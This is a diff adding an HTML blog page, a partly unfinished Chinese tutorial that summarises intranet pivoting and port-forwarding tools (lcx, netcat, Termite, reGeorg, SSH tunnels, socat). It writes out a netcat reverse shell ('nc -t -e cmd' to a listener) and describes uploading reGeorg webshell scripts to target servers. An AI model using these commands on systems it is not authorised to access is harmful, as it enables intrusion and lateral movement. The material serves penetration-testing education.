@@ -1,0 +1,270 @@
+<!DOCTYPE HTML>
+<html class="no-js" lang="zh-CN">
+<!--
+//                            _ooOoo_
+//                           o8888888o
+//                           88" . "88
+//                           (| -_- |)
+//                            O\ = /O
+//                        ____/`---'\____
+//                      .   ' \\| |// `.
+//                       / \\||| : |||// \
+//                     / _||||| -:- |||||- \
+//                       | | \\\ - /// | |
+//                     | \_| ''\---/'' | |
+//                      \ .-\__ `-` ___/-. /
+//                   ___`. .' /--.--\ `. . __
+//                ."" '< `.___\_<|>_/___.' >'"".
+//               | | : `- \`.;`\ _ /`;.`/ - ` : | |
+//                 \ \ `-. \_ __\ /__ _/ .-` / /
+//         ======`-.____`-.___\_____/___.-`____.-'======
+//                            `=---='
+//                 拦截插件累计拦截逗比攻击"1381438"次！
+//         .............................................
+//                  佛祖保佑             永无BUG
+//          佛曰:
+//                  写字楼里写字间，写字间里程序员；
+//                  程序人员写程序，又拿程序换酒钱。
+//                  酒醒只在网上坐，酒醉还来网下眠；
+//                  酒醉酒醒日复日，网上网下年复年。
+//                  但愿老死电脑间，不愿鞠躬老板前；
+//                  奔驰宝马贵者趣，公交自行程序员。
+//                  别人笑我忒疯癫，我笑自己命太贱；
+//                  不见满街漂亮妹，哪个归得程序员？
+-->
+<head>
+    <!--[if lte IE 9]>
+<meta http-equiv="refresh" content="0;url=http://flowray.top/warn.html">
+<![endif]-->
+<meta charset="utf-8">
+
+<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=no">
+<meta http-equiv="mobile-agent" content="format=html5; url=http://flowray.top">
+<meta name="author" content="千夜">
+<link rel="stylesheet" href="//netdna.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+<link rel="stylesheet" href="/css/SimpleStyle.min.css">
+
+<link rel="shortcut icon" href="/images/sitetitle.jpg">
+
+
+<title>内网穿透小结 - 千夜</title>
+
+<meta name="keywords" content="内网穿透小结">
+
+<meta name="description " content="内网穿透小结">
+</head>
+<body>
+<div id="nav">
+    <nav class="nav-menu">
+        <a class="site-name current" href="/" title="夜">夜</a>
+        <a class="site-index current" href="/"><i class="fa fa-home"></i><span>首页</span></a>
+        <a href="/archives" title="归档"><i class="fa fa-archives"></i><span>归档</span></a>
+        <a href="/tags" title="标签"><i class="fa fa-tags"></i><span>标签</span></a>
+        <!-- custom single page of menus -->
+        
+        
+        <a href="/links" title="链接">
+            <i class="fa fa-link"></i>
+            <span>链接</span>
+        </a>
+        
+        
+        <a href="/about" title="关于">
+            <i class="fa fa-user"></i>
+            <span>关于</span>
+        </a>
+        
+    </nav>
+</div>
+
+<div class="nav-user">
+    <a class="btn-search" href="#"><i class="fa fa-search"></i></a>
+    <a class="btn-read-mode" href="#"><i class="fa fa-sun-o"></i></a>
+</div>
+<div id="wrapper" class="clearfix">
+    <div id="body">
+        <div class="main" id="main">
+            <div id="cover">
+    <div class="cover-img"></div>
+    <div class="cover-info">
+        
+        <h1 class="cover-siteName">千夜</h1>
+        <h3 class="cover-siteTitle">长路漫漫，踏歌而行</h3>
+        <p class="cover-siteDesc"></p>
+        <div class="cover-sns">
+            
+        </div>
+    </div>
+</div>
+            <div class="page-title">
+    <ul>
+        <li><a href="/">最新</a></li>
+        
+            
+                <li class="active">
+                    <a href="/categories/secure" data-name="安全">安全</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/program" data-name="编程">编程</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/tool" data-name="工具">工具</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/readThink" data-name="读思">读思</a>
+                </li>
+            
+        
+        <li class="page-search">
+    <form id="search" class="search-form">
+        <label for="s" class="sr-only">请输入关键字</label>
+        <input class="search-field" type="text" name="s" class="text" placeholder="请输入关键字" />
+        <button type="submit" class="search-form-submit" title="搜索"><i class="fa fa-search"></i></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="请输入关键词..."/>
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(无标题)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+</li>
+
+    </ul>
+</div>
+<div class="main-inner">
+    <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+        <div class="post-header">
+            <div class="post-author clearfix">
+                <a class="avatar fleft" href="flowray.top" target="_blank">
+                    <img width="48" src="/images/sitehead.jpg" alt="avatar"/>
+                </a>
+                <p><span class="label">作者</span>
+                    <a href="flowray.top" target="_blank">千夜</a>
+                    <span title="最后编辑于2018-02-20">2018-02-20</span>
+                </p>
+                <p>栽下一棵树的最好时间是昨天，其次是现在。</p>
+            </div>
+            <h2 class="post-title">内网穿透小结</h2>
+            <div class="post-meta">
+                本文总共2986个字 | 您是第<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>位看到它们的小伙伴
+            </div>
+        </div>
+        <div class="post-content markdown-body">
+            <h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1 前言"></a>1 前言</h2><p>内网环境非常复杂，在内网中行动需要代理及端口转发等各种功能。</p>
+<h2 id="2-基本知识概念梳理"><a href="#2-基本知识概念梳理" class="headerlink" title="2 基本知识概念梳理"></a>2 基本知识概念梳理</h2><h3 id="2-1-正向代理与反向代理"><a href="#2-1-正向代理与反向代理" class="headerlink" title="2.1 正向代理与反向代理"></a>2.1 正向代理与反向代理</h3><p><img src="http://myqwerimage.oss-cn-beijing.aliyuncs.com/18-2-17/58302339.jpg" alt=""></p>
+<p><img src="http://myqwerimage.oss-cn-beijing.aliyuncs.com/18-2-17/98033652.jpg" alt=""></p>
+<p>正向代理中，proxy 和 client 同属一个 LAN，对 server 透明； 反向代理中，proxy 和 server 同属一个 LAN，对 client 透明。 实际上 proxy 在两种代理中做的事都是代为收发请求和响应，不过从结构上来看正好左右互换了下，所以把前者那种代理方式叫做正向代理，后者叫做反向代理。</p>
+<h3 id="2-2-端口转发"><a href="#2-2-端口转发" class="headerlink" title="2.2 端口转发"></a>2.2 端口转发</h3><h3 id="2-2-内网常见环境"><a href="#2-2-内网常见环境" class="headerlink" title="2.2 内网常见环境"></a>2.2 内网常见环境</h3><h2 id="3-工具整理"><a href="#3-工具整理" class="headerlink" title="3 工具整理"></a>3 工具整理</h2><h3 id="3-1-Lcx转发"><a href="#3-1-Lcx转发" class="headerlink" title="3.1 Lcx转发"></a>3.1 Lcx转发</h3><h3 id="3-2-NC反弹"><a href="#3-2-NC反弹" class="headerlink" title="3.2 NC反弹"></a>3.2 NC反弹</h3><h4 id="3-2-1-正向连接"><a href="#3-2-1-正向连接" class="headerlink" title="3.2.1 正向连接"></a>3.2.1 正向连接</h4><h4 id="3-2-2-反向连接"><a href="#3-2-2-反向连接" class="headerlink" title="3.2.2 反向连接"></a>3.2.2 反向连接</h4><ol>
+<li>在公网监听<br><code>nc -lp 5555</code></li>
+<li>在内网机器反弹<br><code>nc -t -e cmd 10.10.10.11 5555</code></li>
+</ol>
+<h3 id="3-3-Termite"><a href="#3-3-Termite" class="headerlink" title="3.3 Termite"></a>3.3 Termite</h3><h5 id="3-3-1-简介"><a href="#3-3-1-简介" class="headerlink" title="3.3.1 简介"></a>3.3.1 简介</h5><p>Termite是一个跳板机管理工具，多平台支持。具有SOCKS5架设、端口转发、shell服务假设、文件上传下载功能。可以在复杂的网络环境内打通一条通道。</p>
+<h5 id="3-3-2-下载地址"><a href="#3-3-2-下载地址" class="headerlink" title="3.3.2 下载地址"></a>3.3.2 下载地址</h5><p><a href="http://rootkiter.com/Termite/">http://rootkiter.com/Termite/</a></p>
+<h5 id="3-3-3-使用介绍"><a href="#3-3-3-使用介绍" class="headerlink" title="3.3.3 使用介绍"></a>3.3.3 使用介绍</h5><p>官网有工具使用视频。</p>
+<h3 id="3-4-reGeorg"><a href="#3-4-reGeorg" class="headerlink" title="3.4 reGeorg"></a>3.4 reGeorg</h3><h4 id="3-4-1-简介"><a href="#3-4-1-简介" class="headerlink" title="3.4.1 简介"></a>3.4.1 简介</h4><p>reGeorg 是 reDuh 的升级版，主要是把内网服务器的端口通过 http/https 隧道转发到本机，形成一个回路。用于目标服务器在内网或做了端口策略的情况下连接目标服务器内部开放端口。它利用 webshell 建立一个 socks 代理进行内网穿透，服务器必须支持 aspx、php 或 jsp 这些 web 程序中的一种。</p>
+<h4 id="3-4-2-下载地址"><a href="#3-4-2-下载地址" class="headerlink" title="3.4.2 下载地址"></a>3.4.2 下载地址</h4><p><a href="https://github.com/NoneNotNull/reGeorg">https://github.com/NoneNotNull/reGeorg</a></p>
+<h5 id="3-4-3-使用"><a href="#3-4-3-使用" class="headerlink" title="3.4.3 使用"></a>3.4.3 使用</h5><p>将对应的脚本上传到目标服务器上，然后配合代理软件即可扫描等操作。windows使用proxifire,Linux使用Proxychains。</p>
+<h3 id="3-4-SSH隧道代理转发"><a href="#3-4-SSH隧道代理转发" class="headerlink" title="3.4 SSH隧道代理转发"></a>3.4 SSH隧道代理转发</h3><p>ssh 有三个强大的端口转发命令，分别是本地转发、远程转发、动态转发。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">本地访问127.0.0.1:port1就是host:port2(用的更多)</div><div class="line">ssh -CfNg -L port1:127.0.0.1:port2 user@host    #本地转发</div><div class="line">访问host:port2就是访问127.0.0.1:port1</div><div class="line">ssh -CfNg -R port2:127.0.0.1:port1 user@host    #远程转发</div><div class="line">可以将dmz_host的hostport端口通过remote_ip转发到本地的port端口</div><div class="line">ssh -qTfnN -L port:dmz_host:hostport -l user remote_ip   #正向隧道，监听本地port</div><div class="line">可以将dmz_host的hostport端口转发到remote_ip的port端口</div><div class="line">ssh -qTfnN -R port:dmz_host:hostport -l user remote_ip   #反向隧道，用于内网穿透防火墙限制之类</div><div class="line">socket代理:</div><div class="line">ssh -qTfnN -D port remotehost</div><div class="line">参数详解：</div><div class="line">-q Quiet mode. 安静模式</div><div class="line">-T Disable pseudo-tty allocation. 不占用 shell 了</div><div class="line">-f Requests ssh to go to background just before command execution. 后台运行，并推荐加上 -n 参数</div><div class="line">-N Do not execute a remote command. 不执行远程命令，端口转发就用它了</div><div class="line">-L port:host:hostport </div><div class="line">将本地机(客户机)的某个端口转发到远端指定机器的指定端口. 工作原理是这样的, 本地机器上分配了一个 socket 侦听 port 端口, 一旦这个端口上有了连接, 该连接就经过安全通道转发出去, 同时远程主机和 host 的 hostport 端口建立连接. 可以在配置文件中指定端口的转发. 只有 root 才能转发特权端口. IPv6 地址用另一种格式说明: port/host/hostport</div><div class="line">-R port:host:hostport </div><div class="line">将远程主机(服务器)的某个端口转发到本地端指定机器的指定端口. 工作原理是这样的, 远程主机上分配了一个 socket 侦听 port 端口, 一旦这个端口上有了连接, 该连接就经过安全通道转向出去, 同时本地主机和 host 的 hostport 端口建立连接. 可以在配置文件中指定端口的转发. 只有用 root 登录远程主机才能转发特权端口. IPv6 地址用另一种格式说明: port/host/hostport</div><div class="line">-D port </div><div class="line">指定一个本地机器 “动态的’’ 应用程序端口转发. 工作原理是这样的, 本地机器上分配了一个 socket 侦听 port 端口, 一旦这个端口上有了连接, 该连接就经过安全通道转发出去, 根据应用程序的协议可以判断出远程主机将和哪里连接. 目前支持 SOCKS协议, 将充当SOCKS服务器. 只有 root 才能转发特权端口. 可以在配置文件中指定动态端口的转发.</div></pre></td></tr></table></figure></p>
+<h4 id="3-4-1-ssh-本地转发"><a href="#3-4-1-ssh-本地转发" class="headerlink" title="3.4.1 ssh 本地转发"></a>3.4.1 ssh 本地转发</h4><p>一台机器的某个应用（比如mysql限制了root只能本地登陆）限制了只有本机才能登陆此应用，如果我们想要远程登陆此应用，就可以使用ssh的本地转发。</p>
+<p>命令格式：<code>ssh -L &lt;local port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;SSH hostname&gt;</code></p>
+<p>例如MySQL本地转发：<br>10.10.10.129：mysql服务所在机器。<br><img src="http://myqwerimage.oss-cn-beijing.aliyuncs.com/18-2-20/19123568.jpg" alt=""><br>注意：ssh可以远程登陆mysql服务器。</p>
+<h4 id="3-4-1-ssh-远程转发"><a href="#3-4-1-ssh-远程转发" class="headerlink" title="3.4.1 ssh 远程转发"></a>3.4.1 ssh 远程转发</h4><p>内网的服务器，外网不能直接访问，使用远程转发，将内网的服务器端口转发到外网端口。这时候访问外网的端口，就访问到了内网的端口。<br><code>ssh -CfNg -R 81:127.0.0.1:80 &lt;ssh server&gt;</code></p>
+<h4 id="3-4-3-ssh-动态转发-socks-代理"><a href="#3-4-3-ssh-动态转发-socks-代理" class="headerlink" title="3.4.3 ssh 动态转发 socks 代理"></a>3.4.3 ssh 动态转发 socks 代理</h4><p>把远程主机设置成代理，来代理访问不能访问的资源。在地机器上分配了一个监听端口, 一旦这个端口上有了连接, 该连接就经过 ssh 隧道转发出去, 根据应用程序的协议可以判断出远程主机将和哪里连接。<br><code>ssh -qTfnN -D &lt;local port&gt;  &lt;ssh server&gt;</code></p>
+<p>例子：<br>设置转发：</p>
+<p><img src="http://myqwerimage.oss-cn-beijing.aliyuncs.com/18-2-20/93083896.jpg" alt=""></p>
+<p>使用代理：</p>
+<p><img src="http://myqwerimage.oss-cn-beijing.aliyuncs.com/18-2-20/60645523.jpg" alt=""></p>
+<h3 id="3-6-sSocks"><a href="#3-6-sSocks" class="headerlink" title="3.6 sSocks"></a>3.6 sSocks</h3><h3 id="3-7-socat"><a href="#3-7-socat" class="headerlink" title="3.7 socat"></a>3.7 socat</h3><h4 id="3-7-1-正向shell"><a href="#3-7-1-正向shell" class="headerlink" title="3.7.1 正向shell"></a>3.7.1 正向shell</h4><h4 id="3-7-2-反向shell"><a href="#3-7-2-反向shell" class="headerlink" title="3.7.2 反向shell"></a>3.7.2 反向shell</h4><h3 id="3-8-内网穿透平台"><a href="#3-8-内网穿透平台" class="headerlink" title="3.8 内网穿透平台"></a>3.8 内网穿透平台</h3><p>例如 <a href="https://www.ngrok.cc/、https://natapp.cn">https://www.ngrok.cc/、https://natapp.cn</a> / 等</p>
+<h2 id="4-参考资料"><a href="#4-参考资料" class="headerlink" title="4 参考资料"></a>4 参考资料</h2><p><a href="https://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/index.html">1. 实战 SSH 端口转发</a></p>
+<p><a href="http://www.dkys.org/archives/905.html">1. 内网端口转发及穿透</a></p>
+<p><a href="https://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/index.html">2. 实战 SSH 端口转发</a></p>
+<p><a href="http://blog.neargle.com/SecNewsBak/drops/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E8%BD%AC%E5%8F%91%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93.html">3. 内网渗透工具总结</a></p>
+<p><a href="http://www.freebuf.com/sectool/125237.html">4. Cobalt strike在内网渗透中的使用 </a></p>
+<p><a href="https://mp.weixin.qq.com/s/l-0sWU4ijMOQWqRgsWcNFA">5. 穿越边界的姿势 </a></p>
+<p><a href="https://mp.weixin.qq.com/s/EWL9-AUB_bTf7pU4S4A2zg">6. 内网渗透</a></p>
+<p><a href="https://www.anquanke.com/post/id/85580">7. 多重转发渗透隐藏内网</a></p>
+<p><a href="https://mp.weixin.qq.com/s?__biz=MzA3Mzk1MDk1NA==&amp;mid=2651903919&amp;idx=1&amp;sn=686cc53137aa9e8ec323dda1e54a2c23">8. Linux 端口转发特征总结</a></p>
+
+        </div>
+        <div class="post-tool">
+            <a class="btn-thumbs-up" href="javascript:void(0);" data-cid="52" title="95">
+                <i class="fa fa-thumbs-up" aria-hidden="true"></i> 打赏
+            </a>
+        </div>
+        
+        <div class="post-tags">标签：
+            
+            <a href="/tags/内网渗透/">内网渗透</a>
+            
+            <a href="/tags/代理与转发/">代理与转发</a>
+            
+        </div>
+        
+    </article>
+    
+    <p>本文若有不恰当之处，望不吝赐教</p>
+    
+    
+</div>
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        </div><!-- end #main-->
+    </div><!-- end #body -->
+    <footer class="footer">
+    <div class="footer-inner">
+        <p>
+            本站点采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a>，已建立<a href="/timeline" id="siteBuildingTime"></a>天<br/>
+            ©2017 基于<a href="http://hexo.io" target="_blank">Hexo</a>搭建
+            ，主题&nbsp<a href="https://github.com/tangkunyin/hexo-theme-jsimple" target="_blank">JSimple</a>
+            ，作者<a href="https://www.tangkunyin.com" target="_blank">唐先森</a>
+            ，Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a>
+        </p>
+        
+    </div>
+</footer>
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+<script src="/js/InsightSearch.js"></script>
+<script src="/js/SimpleCore.js"></script>
+
+</div>
+<div class="fixed-btn">
+    <a class="btn-gotop" href="javascript:"> <i class="fa fa-angle-up"></i></a>
+</div>
+<script>
+    $(function () {
+        SimpleCore.init({
+            buildingTime: '08/15/2017',
+            current: $('.post-tags').length > 0 ? 'post' : 'archive',
+            /*wxMpImg: '/images/weixin-mp.png',*/
+            /*donateImg: '/images/donate-qr.png',*/
+        });
+    });
+</script>
+</body>
+</html>
